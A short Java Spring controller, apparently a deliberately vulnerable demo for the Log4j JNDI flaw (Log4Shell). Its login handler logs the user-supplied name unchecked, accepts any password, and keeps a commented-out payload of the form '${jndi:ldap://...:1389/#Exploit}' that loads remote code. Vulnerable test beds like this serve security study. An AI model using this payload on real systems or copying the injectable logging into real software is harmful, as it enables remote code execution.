package com.liliang.log4j.vul;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class UserController {
    private static final Logger log = LoggerFactory.getLogger(UserController.class);

    @ResponseBody
    @RequestMapping("login")
    public String listUser(String userName,String password) {
        log.info("登录成功,用户名:{}", userName);
        // log.info("${jndi:ldap://127.0.0.1:1389/#Exploit}");
        return "登录成功";
    }
}
